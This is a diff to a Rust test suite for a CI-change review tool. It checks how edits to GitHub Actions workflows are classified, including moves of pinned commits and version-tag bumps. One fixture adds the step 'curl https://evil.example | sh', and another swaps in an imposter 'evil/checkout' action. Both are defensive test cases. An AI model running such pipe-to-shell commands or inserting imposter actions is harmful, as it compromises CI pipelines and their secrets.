@@ -45,9 +45,11 @@ fn commit(r: &Path, files: &[(&str, &str)], deleted: &[&str]) -> String {
     git(r, &["commit", "-q", "-m", "change"]);
     git(r, &["rev-parse", "HEAD"])
 }
-fn rules_for(base: &[(&str, &str)], head: &[(&str, &str)], deleted: &[&str]) -> Value {
+fn rules_for(base: &[(&str, &str)], head: &[(&str, &str)], deleted: &[&str]) -> Value { rules_at(None, base, head, deleted) }
+fn rules_at(origin: Option<&str>, base: &[(&str, &str)], head: &[(&str, &str)], deleted: &[&str]) -> Value {
     let t = Temp::new();
     let (r, b) = repo(&t, base);
+    if let Some(url) = origin { git(&r, &["remote", "add", "origin", url]); }
     let h = commit(&r, head, deleted);
     kern::rules::rules(&r, &b, &h).unwrap()
 }
@@ -396,17 +398,22 @@ fn tests_run_next_to_ci_secrets_so_one_that_reads_a_secret_and_reaches_the_netwo
     assert!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())).is_empty(), "NODE_ENV is a setting, not a secret: {}", rules["powers"]);
 }
 
+const POSTHOG: Option<&str> = Some("https://github.com/PostHog/posthog-js.git");
+
 #[test]
-fn posthog_js_5284_a_workflow_that_only_moves_a_pinned_action_to_another_release_is_a_note_never_a_look() {
+fn posthog_js_5284_a_pinned_commit_moved_to_another_commit_is_a_look_naming_both_refs_because_a_version_comment_proves_nothing() {
     let ci = |at: &str| format!("name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: step-security/harden-runner@{at}\n        with:\n          egress-policy: audit\n      - uses: actions/checkout@v4\n      - run: npm test\n");
     let before = ci("e14015d583714f6e62063499dc959a02595150a1 # v2.21.1");
     let after = ci("351661ca32ac09a36dc5ee2d536e3128f2a3c8ed # v2.22.0");
     let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".github/workflows/ci.yml", before.as_str())];
-    let rules = rules_for(&base, &[(".github/workflows/ci.yml", &after)], &[]);
-    assert_eq!(rules["protected"][0]["moves"], json!(["step-security/harden-runner e14015d58371 (v2.21.1) → 351661ca32ac (v2.22.0)"]), "{}", rules["protected"]);
+    let rules = rules_at(POSTHOG, &base, &[(".github/workflows/ci.yml", &after)], &[]);
+    assert_eq!(rules["protected"][0]["moves"], json!([{ "action": "step-security/harden-runner", "from": "e14015d58371 (v2.21.1)", "to": "351661ca32ac (v2.22.0)", "release": false }]),
+        "{}", rules["protected"]);
     let r = receipt::build(&drive_json(), &rules, &clean_tests());
-    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["protected".to_string()]), "Comfy-Org/ComfyUI_frontend#15496 and WordPress/openstation#726 are the same move: {r}");
-    assert!(r["notes"][0]["what"].as_str().unwrap().contains("v2.22.0"), "{}", r["notes"]);
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("look"), vec!["protected".to_string()], vec![]),
+        "GitHub runs a commit that exists only in a fork under the action's own name, and the tj-actions and actions-cool/issues-helper imposter commits carried version comments too: {r}");
+    let what = r["look"][0]["what"].as_str().unwrap();
+    assert!(["step-security/harden-runner", "e14015d58371 (v2.21.1)", "351661ca32ac (v2.22.0)", "fork"].iter().all(|w| what.contains(w)), "the look names the action and both refs: {what}");
     for (why, text) in [
         ("a new step runs code", after.replace("      - run: npm test\n", "      - run: npm test\n      - run: curl https://evil.example | sh\n")),
         ("another action in the step's place", after.replace("actions/checkout@v4", "evil/checkout@v4")),
@@ -414,10 +421,46 @@ fn posthog_js_5284_a_workflow_that_only_moves_a_pinned_action_to_another_release
         ("an input of the moved action", after.replace("egress-policy: audit", "egress-policy: block")),
         ("a step moved to another job", after.replace("      - uses: actions/checkout@v4\n", "  - uses: actions/checkout@v4\n")),
     ] {
-        let rules = rules_for(&base, &[(".github/workflows/ci.yml", &text)], &[]);
+        let rules = rules_at(POSTHOG, &base, &[(".github/workflows/ci.yml", &text)], &[]);
         assert!(rules["protected"][0]["moves"].is_null(), "{why} stays a look: {}", rules["protected"]);
         assert_eq!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())), ["protected"], "{why}");
     }
+}
+
+#[test]
+fn review_stage1_r2_only_a_move_to_a_higher_version_tag_of_another_owners_action_with_nothing_else_changed_is_a_note() {
+    let ci = |uses: &str| format!("name: ci\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {uses}\n      - run: npm test\n");
+    let before = ci("actions/checkout@v4");
+    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".github/workflows/ci.yml", before.as_str())];
+    let answer = |text: &str, origin: Option<&str>| {
+        let r = receipt::build(&drive_json(), &rules_at(origin, &base, &[(".github/workflows/ci.yml", text)], &[]), &clean_tests());
+        (look_kinds(&r), note_kinds(&r), r)
+    };
+    for (to, origin) in [("actions/checkout@v5", POSTHOG), ("actions/checkout@v4.2.2", POSTHOG), ("\"actions/checkout@v5\"", POSTHOG), ("'actions/checkout@v5'", POSTHOG),
+        ("actions/checkout@v5 # latest", POSTHOG), ("actions/checkout@v5", Some("git@github.com:PostHog/posthog-js.git"))] {
+        let (look, notes, r) = answer(&ci(to), origin);
+        assert_eq!((look, notes), (vec![], vec!["protected".to_string()]), "actions/checkout@v4 to {to}: a tag resolves only inside the action's own repository: {r}");
+        let what = r["notes"][0]["what"].as_str().unwrap();
+        assert!(what.contains("actions/checkout v4 →") && what.contains("higher version tag") && !what.contains("release:"), "the note says what Kern checked: {what}");
+    }
+    for (why, to, origin) in [("an older release", "actions/checkout@v3", POSTHOG), ("the same release", "actions/checkout@v4.0.0", POSTHOG),
+        ("a branch, which unpins it", "actions/checkout@main", POSTHOG), ("an arbitrary commit with a version comment", "actions/checkout@0000000000000000000000000000000000000bad # v5", POSTHOG),
+        ("a stray backslash", "actions/checkout@v5\\", POSTHOG), ("a quote inside the ref", "actions/checkout@\"v5\"", POSTHOG),
+        ("a tag the checked repository's own owner can make", "actions/checkout@v5", Some("https://github.com/actions/runner")), ("a repository Kern cannot name", "actions/checkout@v5", None)] {
+        let (look, notes, r) = answer(&ci(to), origin);
+        assert_eq!((look, notes), (vec!["protected".to_string()], vec![]), "{why}: {r}");
+        assert!(r["look"][0]["what"].as_str().unwrap().contains("actions/checkout v4 →"), "the look names the action and both refs: {}", r["look"]);
+    }
+    let deploy = "name: ci\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n  deploy:\n    if: github.ref == 'refs/heads/main'\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./deploy.sh\n";
+    let moved = "name: ci\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n      - run: ./deploy.sh\n  deploy:\n    if: github.ref == 'refs/heads/main'\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n";
+    let rules = rules_at(POSTHOG, &[("package.json", VITEST), (".github/workflows/ci.yml", deploy)], &[(".github/workflows/ci.yml", moved)], &[]);
+    assert!(rules["protected"][0]["moves"].is_null(), "the deploy step now runs in the pull request's own job beside the bump, so line order counts: {}", rules["protected"]);
+    let circle = |at: &str| format!("jobs:\n  test:\n    steps:\n      - uses: actions/checkout@{at}\n");
+    let rules = rules_at(POSTHOG, &[("package.json", VITEST), (".circleci/config.yml", &circle("v4"))], &[(".circleci/config.yml", &circle("v5"))], &[]);
+    assert!(rules["protected"][0]["moves"].is_null(), "only GitHub workflows and actions run uses lines: {}", rules["protected"]);
+    let action = |at: &str| format!("runs:\n  using: composite\n  steps:\n    - uses: actions/setup-node@{at}\n");
+    let rules = rules_at(POSTHOG, &[("package.json", VITEST), (".github/actions/setup/action.yml", &action("v4"))], &[(".github/actions/setup/action.yml", &action("v4.1.0"))], &[]);
+    assert_eq!(note_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())), ["protected"], "a composite action's steps are uses lines too: {}", rules["protected"]);
 }
 
 #[test]
